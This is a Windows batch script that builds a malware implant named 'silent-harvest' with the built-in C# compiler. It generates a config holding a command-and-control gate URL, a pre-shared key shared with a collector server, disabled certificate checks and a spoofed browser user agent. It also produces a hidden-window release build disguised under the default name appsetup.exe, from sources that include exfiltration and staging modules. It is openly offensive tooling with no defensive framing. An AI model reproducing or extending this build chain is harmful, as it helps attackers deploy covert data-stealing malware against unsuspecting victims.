@echo off
rem ============================================================
rem  silent-harvest implant build (in-box csc.exe, no toolchain)
rem
rem  usage: build.bat [/name app.exe] [/c2 http://host:8443/gate]
rem                    [/psk SECRET] [/release-only]
rem
rem  builds:
rem    build\sh_debug.exe    console build with stage logging
rem    build\<name>          GUI build (no console), default appsetup.exe
rem
rem  /psk writes the key to server\psk.txt for the collector too.
rem ============================================================
setlocal enabledelayedexpansion
set CSC=%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe
if not exist "%CSC%" set CSC=%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe
if not exist "%CSC%" (
    echo [ERR] no in-box csc.exe found & exit /b 1
)

set NAME=appsetup.exe
set C2=http://127.0.0.1:8443/gate
set PSK=dev-psk-change-me
set RELEASEONLY=0

:parse
if "%~1"=="" goto done
if /i "%~1"=="/name"   ( set NAME=%~2& shift& shift& goto parse )
if /i "%~1"=="/c2"     ( set C2=%~2& shift& shift& goto parse )
if /i "%~1"=="/psk"    ( set PSK=%~2& shift& shift& goto parse )
if /i "%~1"=="/release-only" ( set RELEASEONLY=1& shift& goto parse )
echo [WARN] unknown arg %1 & exit /b 1
:done

if not exist build mkdir build

rem --- regenerate Config.cs ---
> implant\Config.cs echo // generated by build.bat at %DATE% %TIME%
>> implant\Config.cs echo using System;
>> implant\Config.cs echo.
>> implant\Config.cs echo namespace SilentHarvest
>> implant\Config.cs echo {
>> implant\Config.cs echo     public static class Cfg
>> implant\Config.cs echo     {
>> implant\Config.cs echo         public const string C2 = "%C2%";
>> implant\Config.cs echo         public const string PSK = "%PSK%";
>> implant\Config.cs echo         public const bool AcceptAnyCert = true;
>> implant\Config.cs echo         public const string UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
>> implant\Config.cs echo     }
>> implant\Config.cs echo }

rem --- share the PSK with the collector ---
> server\psk.txt echo %PSK%

echo [*] C2     = %C2%
echo [*] PSK    = %PSK%
if "%PSK%"=="dev-psk-change-me" echo [WARN] default dev PSK in use - pass /psk

set SRCS=implant\Native.cs implant\Util.cs implant\Crypto.cs implant\Stages.cs implant\Exfil.cs implant\Program.cs implant\Config.cs

if %RELEASEONLY%==0 (
    echo [*] building console/debug build...
    "%CSC%" /nologo /target:exe /optimize+ /define:DEBUG_LOG /out:build\sh_debug.exe %SRCS%
    if errorlevel 1 exit /b 1
)

echo [*] building release (GUI) build: build\%NAME%
"%CSC%" /nologo /target:winexe /optimize+ /out:build\%NAME% %SRCS%
if errorlevel 1 exit /b 1

echo [+] done.
endlocal
